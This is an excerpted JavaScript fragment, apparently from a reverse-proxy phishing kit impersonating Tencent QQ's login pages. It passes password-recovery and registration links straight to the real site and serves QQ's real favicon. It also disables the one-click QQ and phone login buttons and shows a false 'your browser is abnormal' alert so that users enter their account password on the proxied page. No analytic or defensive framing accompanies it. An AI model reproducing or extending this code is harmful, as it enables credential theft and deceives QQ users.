...
// 特殊处理：找回密码和新用户注册链接不代理
if(relativePath_str.includes("accounts.qq.com/psw/find") || 
   relativePath_str.includes("ssl.zc.qq.com/phone/index.html") ||
   relativePath_str.includes("ui.ptlogin2.qq.com/cgi-bin/ssl/check")) {
  return relativePath_str;
}

// 特殊处理：阻止一键登录打开QQ应用
if(relativePath_str.includes("ptlogin2.qq.com") || 
   relativePath_str.includes("mqqapi://") ||
   relativePath_str.includes("tencent://")) {
...
window.addEventListener('load', () => {
  ...
  setTimeout(function() {
    ...
    buttons.forEach(function(btn) {
      ...
      if (text.includes('QQ登录') || text.includes('一键登录') || text.includes('手机一键登录')) {
        // 阻止打开QQ应用
        btn.onclick = function(e) {
          e.preventDefault();
          e.stopPropagation();
          alert('你的浏览器异常，请尝试使用账号密码登录');
          return false;
        };
...
async function handleRequest(request) {
  ...
  if (request.url.endsWith("favicon.ico")) {
    return getRedirect("https://ti.qq.com/favicon.ico");
  }
  ...
  // 特殊处理：对于找回密码和新用户注册链接，直接重定向到原链接
  if (actualUrlStr.includes("accounts.qq.com/psw/find") || 
      actualUrlStr.includes("ssl.zc.qq.com/phone/index.html") ||
      actualUrlStr.includes("ui.ptlogin2.qq.com/cgi-bin/ssl/check")) {
